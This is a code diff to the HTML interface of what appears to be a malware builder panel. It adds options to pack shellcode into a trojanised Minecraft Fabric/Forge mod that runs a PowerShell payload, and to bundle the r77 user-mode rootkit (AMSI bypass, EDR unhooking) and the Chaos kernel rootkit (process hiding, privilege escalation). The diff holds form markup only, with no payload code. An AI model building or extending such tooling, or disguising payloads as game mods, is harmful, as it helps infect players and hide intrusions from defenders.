@@ -332,6 +332,69 @@
                       </div>
                     </div>
 
+                    <!-- Minecraft JAR Dropper -->
+                    <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-green-500 transition-colors">
+                      <input type="checkbox" name="enable-jar" class="w-4 h-4" />
+                      <div class="flex flex-col">
+                        <span class="flex items-center gap-2">
+                          <i class="fa-brands fa-java text-green-400"></i> Minecraft JAR Dropper
+                        </span>
+                        <span class="text-xs text-slate-500">Bundle shellcode into a Fabric/Forge mod .jar — drops and executes payload via PowerShell on run (requires JDK on server, windows-amd64 target)</span>
+                      </div>
+                    </label>
+
+                    <div id="jar-settings-container" class="hidden pl-3 border-l-2 border-green-500/40 flex flex-col gap-2">
+                      <div class="grid grid-cols-2 gap-2">
+                        <div>
+                          <label class="block text-xs font-medium text-slate-400 mb-1" for="jar-mc-version">MC Version</label>
+                          <select id="jar-mc-version" name="jar-mc-version"
+                            class="w-full px-3 py-2 bg-slate-800/80 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-green-500 transition-colors">
+                            <option value="1.21.4" selected>1.21.4</option>
+                            <option value="1.21.3">1.21.3</option>
+                            <option value="1.21.1">1.21.1</option>
+                            <option value="1.21">1.21</option>
+                          </select>
+                        </div>
+                        <div>
+                          <label class="block text-xs font-medium text-slate-400 mb-1" for="jar-mod-id">Mod ID</label>
+                          <input type="text" id="jar-mod-id" name="jar-mod-id" maxlength="32"
+                            pattern="[a-z0-9_]+" placeholder="mcmod"
+                            class="w-full px-3 py-2 bg-slate-800/80 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-green-500 transition-colors placeholder:text-slate-600" />
+                        </div>
+                      </div>
+                      <div>
+                        <label class="block text-xs font-medium text-slate-400 mb-1" for="jar-mod-name">Display Name</label>
+                        <input type="text" id="jar-mod-name" name="jar-mod-name" maxlength="64"
+                          placeholder="Minecraft Mod"
+                          class="w-full px-3 py-2 bg-slate-800/80 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-green-500 transition-colors placeholder:text-slate-600" />
+                      </div>
+                    </div>
+
+                    <!-- r77 Rootkit -->
+                    <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-rose-500 transition-colors">
+                      <input type="checkbox" name="enable-r77" class="w-4 h-4" />
+                      <div class="flex flex-col">
+                        <span class="flex items-center gap-2">
+                          <i class="fa-solid fa-ghost text-rose-400"></i> r77 Rootkit
+                          <span class="text-xs bg-rose-900/50 text-rose-300 px-1.5 py-0.5 rounded">Ring 3</span>
+                        </span>
+                        <span class="text-xs text-slate-500">Fileless user-mode rootkit — hides files, processes, registry keys, network connections; AMSI bypass + EDR unhooking (bytecode77/r77-rootkit)</span>
+                      </div>
+                    </label>
+
+                    <!-- Chaos Rootkit -->
+                    <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-red-600 transition-colors">
+                      <input type="checkbox" name="enable-chaos" class="w-4 h-4" />
+                      <div class="flex flex-col">
+                        <span class="flex items-center gap-2">
+                          <i class="fa-solid fa-skull text-red-500"></i> Chaos Rootkit
+                          <span class="text-xs bg-red-900/50 text-red-300 px-1.5 py-0.5 rounded">Ring 0</span>
+                          <span class="text-xs bg-red-900/50 text-red-300 px-1.5 py-0.5 rounded">Ring 3</span>
+                        </span>
+                        <span class="text-xs text-slate-500">Kernel-mode driver (DKOM process hiding, privilege escalation, file protection) + ring-3 GUI/console controller (ZeroMemoryEx/Chaos-Rootkit)</span>
+                      </div>
+                    </label>
+
                     <div class="flex flex-col gap-1">
                       <label class="block text-xs font-medium text-slate-400 mb-1" for="sleep-seconds">
                         <i class="fa-solid fa-hourglass-half text-yellow-400"></i> Startup Sleep (seconds)
